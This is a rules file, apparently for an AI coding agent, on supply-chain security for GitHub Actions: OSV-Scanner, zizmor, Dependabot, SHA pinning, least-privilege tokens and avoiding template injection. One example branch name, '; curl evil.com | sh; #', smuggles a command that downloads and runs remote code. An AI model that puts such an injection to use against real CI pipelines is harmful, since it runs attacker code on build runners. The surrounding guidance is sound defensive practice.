---
paths:
  - ".github/workflows/**/*.yml"
  - ".github/workflows/**/*.yaml"
---

# Supply-chain security (runtime-neutral)

Rules that apply regardless of language or package manager. Package-manager-specific controls live in `modules/pnpm/rules/pnpm-security.md` and `modules/bun/rules/bun-security.md`.

## OSV-Scanner

`.github/workflows/security.yml` runs OSV-Scanner against committed lockfiles on every push, PR, and weekly cron. Catches vulnerabilities disclosed **after** a dependency was installed (cooldown alone does not help with those). Auto-detects `pnpm-lock.yaml`, `package-lock.json`, `bun.lock`, `bun.lockb`, `Cargo.lock`, `go.sum`, `requirements.txt`, etc.

## zizmor

Same workflow runs zizmor for static analysis of GitHub Actions misconfigurations (unsafe expression interpolation, overprivileged tokens, missing `persist-credentials: false`, etc.). Treat zizmor findings the way you treat type errors: fix or suppress with a documented reason.

## Dependabot

`.github/dependabot.yml` ships alongside this module. Covers three ecosystems at once:

- `github-actions` at `/` — keeps workflow `uses:` SHAs current (the trailing-comment style above is what Dependabot updates).
- `npm` at `/`, `/apps/*`, `/packages/*` — covers root + monorepo workspace packages. Works for both pnpm and bun lockfiles.
- `cargo` at `/`, `/crates/*` — covers single-crate + workspace Rust projects.

The `new` and `retrofit` skills prune the npm or cargo block when the project doesn't use that ecosystem (e.g. an axum-api project gets cargo + github-actions only). All three blocks use the same 1-day cooldown (matching `.npmrc` `minimum-release-age` where applicable) and group related packages (react, tanstack, effect, biome, tailwind, drizzle, vite, hono) into single PRs so update PR noise stays low.

zizmor flags cooldowns under 7 days as `dependabot-cooldown`; the 1-day choice is an intentional mismatch — documented inline in the config with `# zizmor: ignore[dependabot-cooldown]`.

## Pinned actions

Every `uses:` reference in `.github/workflows/*.yml` is pinned to a 40-character commit SHA with the version as a trailing comment:

```yaml
uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2
```

A commit SHA cannot be reassigned. Even if the tag `v6` is repointed to malicious code, the workflow continues to execute the exact commit that was reviewed.

The trailing-comment placement matters — Dependabot updates the SHA + comment together. Other styles go stale.

## No GitHub-context interpolation in `run:` blocks

Workflow `run:` script bodies must **never** inline `${{ github.<thing> }}` directly — that's a code-injection vector when the value is attacker-controllable (e.g. a malicious PR branch named `; curl evil.com | sh; #`). Pass through `env:` and read shell variables instead:

```yaml
# Bad — github.head_ref interpolated into shell
- run: |
    git checkout "${{ github.head_ref }}"

# Good — env var, no template injection surface
- run: |
    git checkout "$BRANCH"
  env:
    BRANCH: ${{ github.head_ref }}
```

Safe to interpolate inline: top-level `env:`, `if:` conditions, action `with:` inputs, `concurrency.group`. Risky: anything that ends up parsed by a shell.

zizmor's `template-injection` rule catches this in CI.

## Least-privilege tokens

Every job declares minimum `permissions:`. The workflow's top-level `permissions: contents: read` denies everything else by default; jobs that need more (`security-events: write` to publish SARIF, `id-token: write` for OIDC) opt in explicitly.

## `persist-credentials: false` on checkouts

`actions/checkout` by default leaves a `GITHUB_TOKEN` on the runner that subsequent steps can use. Disable unless the job actually needs to push.

```yaml
- uses: actions/checkout@<sha> # vX.Y.Z
  with:
    persist-credentials: false
```
